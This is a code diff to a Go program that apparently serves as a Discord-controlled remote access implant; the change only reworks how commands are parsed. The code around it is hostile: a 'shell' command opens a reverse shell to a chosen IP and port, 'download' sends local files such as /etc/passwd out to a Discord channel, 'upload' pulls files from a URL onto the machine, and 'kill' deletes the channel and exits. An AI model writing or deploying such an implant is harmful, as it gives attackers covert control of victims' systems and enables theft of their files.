@@ -106,6 +106,7 @@ func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
 		}
 	}
 
+	// check for role mention or string letredin
 	first := ""
 	rest := ""
 	if strings.HasPrefix(strings.ToLower(message.Content), "letredin") || len(message.MentionRoles) > 0 {
@@ -117,19 +118,24 @@ func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
 		}
 	}
 
+	// in case the command was sent through individual channel
+	if rest == "" {
+		rest = message.Content
+	}
+
 	if !message.Author.Bot || len(message.MentionRoles) > 0 || strings.EqualFold(first, "letredin") {
 		if message.ChannelID == channelID.ID {
-			if message.Content == "ping" {
+			if rest == "ping" {
 				dg.ChannelMessageSend(message.ChannelID, "I'm alive bruv")
-			} else if message.Content == "kill" {
+			} else if rest == "kill" {
 				dg.ChannelDelete(channelID.ID)
 				os.Exit(0)
-			} else if strings.HasPrefix(message.Content, "cd") {
-				commandBreakdown := strings.Fields(message.Content)
+			} else if strings.HasPrefix(rest, "cd") {
+				commandBreakdown := strings.Fields(rest)
 				os.Chdir(commandBreakdown[1])
 				dg.ChannelMessageSend(message.ChannelID, "```Directory changed to "+commandBreakdown[1]+"```")
-			} else if strings.HasPrefix(message.Content, "shell") {
-				splitCommand := strings.Fields(message.Content)
+			} else if strings.HasPrefix(rest, "shell") {
+				splitCommand := strings.Fields(rest)
 				if len(splitCommand) == 1 {
 					dg.ChannelMessageSend(message.ChannelID, "``` shell <type> <ip> <port> \n Example: shell bash 127.0.0.1 1337, shell sh 127.0.0.1 69696\n Shell type: bash and sh```")
 				} else if len(splitCommand) == 4 {
@@ -165,8 +171,8 @@ func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
 				} else {
 					dg.ChannelMessageSend(message.ChannelID, "``` Incomplete command ```")
 				}
-			} else if strings.HasPrefix(message.Content, "download") {
-				commandBreakdown := strings.Fields(message.Content)
+			} else if strings.HasPrefix(rest, "download") {
+				commandBreakdown := strings.Fields(rest)
 				if len(commandBreakdown) == 1 {
 					dg.ChannelMessageSend(message.ChannelID, "Please specify file(s): download /etc/passwd")
 					return
@@ -180,8 +186,8 @@ func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
 						dg.ChannelFileSend(message.ChannelID, file, bufio.NewReader(fileReader))
 					}
 				}
-			} else if strings.HasPrefix(message.Content, "upload") {
-				commandBreakdown := strings.Split(message.Content, " ")
+			} else if strings.HasPrefix(rest, "upload") {
+				commandBreakdown := strings.Split(rest, " ")
 				if len(commandBreakdown) == 1 {
 					dg.ChannelMessageSend(message.ChannelID, "Please specify the file: upload /etc/ssh/sshd_config(with attached file) or upload http://example.com/test.txt /tmp/test.txt")
 					return
